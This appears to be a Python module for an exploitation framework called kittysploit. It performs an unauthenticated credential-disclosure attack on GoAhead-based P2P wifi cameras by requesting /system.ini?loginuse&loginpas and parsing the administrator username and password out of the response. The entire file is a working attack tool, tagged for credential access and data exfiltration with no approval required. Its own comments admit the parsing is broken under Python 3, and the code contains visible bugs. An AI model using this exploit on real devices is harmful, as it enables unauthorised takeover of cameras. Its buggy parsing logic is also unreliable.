#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""P2P wificam credential disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'P2P wificam credential disclosure',
        'description': 'A credential disclosure in several cameras which utilize the GoAhead webserver.',
        'author': ['Pierre Kim', 'casept'],
        
        'platform': Platform.LINUX,
        'references': ['https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            response = self.http_request(
                method="GET",
                path="/system.ini?loginuse&loginpas"
            )

            print_info("Exploit succeeded, extracting credentials...")

            # May the lord forgive me for writing such spaghetti
            # Find the magic sequence "0000 0a0a 0a0a 01"
            magic_sequence_location = response.content.find(b'\x00\x00\x0a\x0a\x0a\x0a\x01')
            # Skip ahead by 144 bytes to the beginning of username
            username_location = magic_sequence_location + 144
            # Read every byte in a loop until the first '\x00'
            # THIS WILL NOT WORK UNDER PYTHON 3!
            username_bytes = bytearray()
            next_username_byte = bytes()
            index = username_location
            while next_username_byte != b'\x00':
                username_bytes.append(response.content[index])
                next_username_byte = response.content[index + 1]
                index = index + 1
            username = username_bytes.decode('utf-8')
            print_success("Username: " + username)

            # Same for the password
            # Get the password's location (everything between username and password is \x00)
            current_byte_location = username_location + len(username_bytes)
            null_byte = bytearray(b'\x00')
            current_byte = bytearray(b'\x00')
            while current_byte == null_byte:
                current_byte[0] = response.content[current_byte_location].encode('utf-8')
                current_byte_location = current_byte_location + 1
            # I can't be bothered to debug anymore, let's just subtract 1
            password_location = current_byte_location - 1
            # Read every byte in a loop until the first '\x00'
            password_bytes = bytearray()
            next_password_byte = bytes()
            index = password_location
            while next_password_byte != b'\x00':
                password_bytes.append(response.content[index])
                next_password_byte = response.content[index + 1]
                index = index + 1
            password = password_bytes.decode('utf-8')
            print_success("Password: " + password)
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/system.ini?loginuse&loginpas"
        )

        if response is None:
            return False
        if response.status_code == 200 and b'\x00\x00\x0a\x0a\x0a\x0a\x01' in response.content:
            return True

        return False
